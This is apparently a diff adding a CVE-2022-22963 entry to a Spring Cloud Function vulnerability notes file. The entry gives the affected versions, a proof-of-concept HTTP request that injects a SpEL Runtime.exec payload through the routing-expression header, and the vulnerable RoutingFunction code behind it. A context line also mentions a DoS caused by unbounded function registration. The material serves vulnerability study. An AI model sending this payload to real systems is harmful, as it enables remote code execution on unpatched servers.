@@ -30,4 +30,33 @@ public <T> void register(FunctionRegistration<T> registration) {
     this.functionRegistrations.add(registration); //将funtion注册在funtionRegistrations中，它是CopyOnWriteArraySet类型，随着size无限增大造成DoS
 }
 ```
+### CVE-2022-22963 SpEL
+Affected Version: <= 3.1.6, 3.2.2   
+POC: 
+```
+POST /functionRouter HTTP/1.1
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("open -a Calculator")
 
+aaa
+```
+Factor: 
+```
+RoutingFunction
+private Object route(Object input, boolean originalInputIsPublisher) {
+    Function function;
+    if (input instanceof Message) {
+        if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.definition"))) {...}
+        else if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.routing-expression"))) {
+            function = this.functionFromExpression((String)message.getHeaders().get("spring.cloud.function.routing-expression"), message);
+            ...
+        }...
+}
+
+private final StandardEvaluationContext evalContext = new StandardEvaluationContext();
+
+private Function functionFromExpression(String routingExpression, Object input) {
+    Expression expression = this.spelParser.parseExpression(routingExpression);
+    String functionName = (String)expression.getValue(this.evalContext, input, String.class);
+    ...
+}
+```
